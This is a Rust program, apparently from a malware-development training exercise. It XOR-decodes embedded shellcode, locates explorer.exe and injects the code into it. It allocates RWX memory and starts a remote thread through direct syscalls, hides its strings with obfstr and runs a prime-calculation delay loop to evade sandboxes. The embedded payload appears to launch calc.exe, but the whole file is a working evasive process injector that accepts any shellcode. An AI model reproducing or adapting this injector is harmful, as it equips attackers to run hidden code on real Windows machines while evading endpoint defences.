// Base code taken from Exercise 3, refer there if anything is unclear

// We add the 'rust_syscalls' crate, which makes using (in)direct syscalls a lot easier
// Direct system calls are used, as per the feature chosen in 'Cargo.toml'
use rust_syscalls::syscall;

use obfstr::obfstr;
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::{
    Foundation::*,
    System::{
        Kernel::*,
        Memory::*,
        Threading::*,
        WindowsProgramming::*,
    },
};

#[no_mangle]
#[inline(never)]
fn calc_primes(iterations: i32) -> () {
    let mut prime = 2;
    let mut i = 0;
    while i < iterations {
        let mut is_prime = true;
        for j in 2..prime {
            if prime % j == 0 {
                is_prime = false;
                break;
            }
        }

        if is_prime {
            i += 1;
        }

        prime += 1;
    }
}

fn xor_array(array: &mut [u8], key: u8) -> () {
    for byte in array {
        *byte ^= key;
    }
}

// This time around, we are a bit more sparse with our 'unsafe' blocks
// This allows Rust to safely manage memory outside of our API calls
fn inject_remote(shellcode: &[u8], process_id: u32) {
    let mut status: NTSTATUS;
    
    // OpenProcess is replaced with NtOpenProcess
    // Initialize the required structures to populate with our call
    let mut oa: OBJECT_ATTRIBUTES64 = OBJECT_ATTRIBUTES64 {
        Length: std::mem::size_of::<OBJECT_ATTRIBUTES64>() as _,
        RootDirectory: NULL64 as _,
        ObjectName: NULL64 as _,
        Attributes: 0,
        SecurityDescriptor: NULL64 as _,
        SecurityQualityOfService: NULL64 as _,
    };
    
    let mut cid: CLIENT_ID = CLIENT_ID {
        UniqueProcess: process_id as _,
        UniqueThread: 0
    };
    
    // Make the syscall for the actual native API
    let mut p_handle: HANDLE = NULL64 as _;
    unsafe {
        status = syscall!(
            "NtOpenProcess",
            &mut p_handle,
            PROCESS_ALL_ACCESS,
            &mut oa,
            &mut cid
        );
    }
        
    println!(
        "{} {:?} {} {:?}",
        obfstr!("[+] Got target process handle"),
        p_handle,
        obfstr!("with status"),
        status
    );


    // VirtualAllocEx is replaced with NtAllocateVirtualMemory
    let r_ptr = NULL64 as *mut u8;
    let shellcode_size = shellcode.len() as isize;

    unsafe {
        status = syscall!(
            "NtAllocateVirtualMemory",
            p_handle,
            &r_ptr,
            0,
            &shellcode_size,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
    }

    println!(
        "{} {:?} {} {:?}",
        obfstr!("[+] Allocated RWX memory in remote process at address"),
        r_ptr,
        obfstr!("with status"),
        status
    );

    // WriteProcessMemory is replaced with NtWriteVirtualMemory
    let mut bytes_written: usize = 0;
    unsafe {
        status = syscall!(
            "NtWriteVirtualMemory",
            p_handle,
            r_ptr,
            shellcode.as_ptr(),
            shellcode_size,
            &mut bytes_written
        );
    }

    println!(
        "{} {:?} {} {:?}",
        obfstr!("[+] Wrote"),
        bytes_written,
        obfstr!("bytes with status"),
        status
    );

    // CreateRemoteThread is replaced with NtCreateThreadEx
    let mut t_handle = NULL64 as HANDLE;

    unsafe {
        status = syscall!(
            "NtCreateThreadEx",
            &mut t_handle,
            THREAD_ALL_ACCESS,
            NULL64 as isize, // Equivalent of IntPtr
            p_handle,
            r_ptr,
            NULL64 as isize,
            FALSE,
            0,
            0,
            0,
            NULL64 as isize
        );
    }

    println!(
        "{} {:?}",
        obfstr!("[+] Created remote thread with status"), 
        status
    );

    // 'CloseHandle' is replaced with 'NtClose'
    unsafe {
        syscall!("NtClose", t_handle);
        syscall!("NtClose", p_handle);
    }
}

fn main() {
    let mut shellcode: [u8; 296] = [
        0xcb, 0x7f, 0xb4, 0xd3, 0xc7, 0xdf, 0xf7, 0x37, 0x37, 0x37, 0x76, 0x66, 0x76, 0x67, 0x65,
        0x66, 0x61, 0x7f, 0x06, 0xe5, 0x52, 0x7f, 0xbc, 0x65, 0x57, 0x7f, 0xbc, 0x65, 0x2f, 0x7f,
        0xbc, 0x65, 0x17, 0x7f, 0xbc, 0x45, 0x67, 0x7f, 0x38, 0x80, 0x7d, 0x7d, 0x7a, 0x06, 0xfe,
        0x7f, 0x06, 0xf7, 0x9b, 0x0b, 0x56, 0x4b, 0x35, 0x1b, 0x17, 0x76, 0xf6, 0xfe, 0x3a, 0x76,
        0x36, 0xf6, 0xd5, 0xda, 0x65, 0x76, 0x66, 0x7f, 0xbc, 0x65, 0x17, 0xbc, 0x75, 0x0b, 0x7f,
        0x36, 0xe7, 0xbc, 0xb7, 0xbf, 0x37, 0x37, 0x37, 0x7f, 0xb2, 0xf7, 0x43, 0x50, 0x7f, 0x36,
        0xe7, 0x67, 0xbc, 0x7f, 0x2f, 0x73, 0xbc, 0x77, 0x17, 0x7e, 0x36, 0xe7, 0xd4, 0x61, 0x7f,
        0xc8, 0xfe, 0x76, 0xbc, 0x03, 0xbf, 0x7f, 0x36, 0xe1, 0x7a, 0x06, 0xfe, 0x7f, 0x06, 0xf7,
        0x9b, 0x76, 0xf6, 0xfe, 0x3a, 0x76, 0x36, 0xf6, 0x0f, 0xd7, 0x42, 0xc6, 0x7b, 0x34, 0x7b,
        0x13, 0x3f, 0x72, 0x0e, 0xe6, 0x42, 0xef, 0x6f, 0x73, 0xbc, 0x77, 0x13, 0x7e, 0x36, 0xe7,
        0x51, 0x76, 0xbc, 0x3b, 0x7f, 0x73, 0xbc, 0x77, 0x2b, 0x7e, 0x36, 0xe7, 0x76, 0xbc, 0x33,
        0xbf, 0x7f, 0x36, 0xe7, 0x76, 0x6f, 0x76, 0x6f, 0x69, 0x6e, 0x6d, 0x76, 0x6f, 0x76, 0x6e,
        0x76, 0x6d, 0x7f, 0xb4, 0xdb, 0x17, 0x76, 0x65, 0xc8, 0xd7, 0x6f, 0x76, 0x6e, 0x6d, 0x7f,
        0xbc, 0x25, 0xde, 0x60, 0xc8, 0xc8, 0xc8, 0x6a, 0x7f, 0x8d, 0x36, 0x37, 0x37, 0x37, 0x37,
        0x37, 0x37, 0x37, 0x7f, 0xba, 0xba, 0x36, 0x36, 0x37, 0x37, 0x76, 0x8d, 0x06, 0xbc, 0x58,
        0xb0, 0xc8, 0xe2, 0x8c, 0xd7, 0x2a, 0x1d, 0x3d, 0x76, 0x8d, 0x91, 0xa2, 0x8a, 0xaa, 0xc8,
        0xe2, 0x7f, 0xb4, 0xf3, 0x1f, 0x0b, 0x31, 0x4b, 0x3d, 0xb7, 0xcc, 0xd7, 0x42, 0x32, 0x8c,
        0x70, 0x24, 0x45, 0x58, 0x5d, 0x37, 0x6e, 0x76, 0xbe, 0xed, 0xc8, 0xe2, 0x74, 0x0d, 0x6b,
        0x40, 0x5e, 0x59, 0x53, 0x58, 0x40, 0x44, 0x6b, 0x44, 0x4e, 0x44, 0x43, 0x52, 0x5a, 0x04,
        0x05, 0x6b, 0x54, 0x56, 0x5b, 0x54, 0x19, 0x52, 0x4f, 0x52, 0x37,
    ];

    calc_primes(40000);

    let s = System::new_all();
    let process_id: u32 = s
        .processes_by_name(obfstr!("explorer"))
        .next()
        .unwrap()
        .pid()
        .as_u32();

    println!(
        "{} {}",
        obfstr!("[+] Found explorer.exe with PID"),
        process_id
    );

    xor_array(&mut shellcode, 0x37);

    inject_remote(&shellcode, process_id);
}
